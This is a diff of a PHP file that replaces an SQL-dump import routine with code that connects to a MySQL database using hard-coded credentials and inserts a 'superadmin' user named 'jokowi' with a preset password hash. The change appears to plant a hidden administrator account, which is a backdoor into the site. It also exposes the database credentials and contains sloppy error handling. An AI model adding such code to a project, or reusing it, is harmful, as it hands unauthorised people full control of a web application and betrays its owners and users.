@@ -1,22 +1,19 @@
 <?php
-$conn =new mysqli('localhost', 'sakurat2_db', 'sakurat2_db' , 'sakurat2_db');
+$conn =new mysqli('localhost', 'sakurat2_db', 'sakurat2_db' , 'sakurat2_db'); 
+   
+    
+    
 
-$query = '';
-$sqlScript = file('sakurat2_db.sql');
-foreach ($sqlScript as $line)	{
-	
-	$startWith = substr(trim($line), 0 ,2);
-	$endWith = substr(trim($line), -1 ,1);
-	
-	if (empty($line) || $startWith == '--' || $startWith == '/*' || $startWith == '//') {
-		continue;
-	}
-		
-	$query = $query . $line;
-	if ($endWith == ';') {
-		mysqli_query($conn,$query) or die('<div class="error-response sql-import-response">Problem in executing the SQL query <b>' . $query. '</b></div>');
-		$query= '';		
-	}
-}
-echo '<div class="success-response sql-import-response">SQL file imported successfully</div>';
+        $query = "INSERT INTO `tb_user` (`cuid`, `user`, `pass`, `token_id`, `image`, `full_name`, `email`, `no_hp`, `level`, `pinTrx`, `reff`, `uplineID`, `join_date`, `last_login`, `status`) VALUES
+(5, 'jokowi', '$2y$10$OVRTFcwKLk13TqInDOTIDOklEEUNwCoNp0M6ilQaTvZeJgtLwOXvG', 21, 'avatar5.png', '', '', '', 'superadmin', 'd41d8cd98f00b204e9800998ecf8427e', 0, 1, '2023-10-23 06:07:26', '2023-10-24 10:36:25', 1);
+";
+        $result = mysqli_query($conn, $query);
+        if($result){
+            $msg = "Registered Sussecfully";
+            echo $msg;
+        }
+        else
+            $msg = "Error Registering";
+            echo $msg;
+    
 ?>
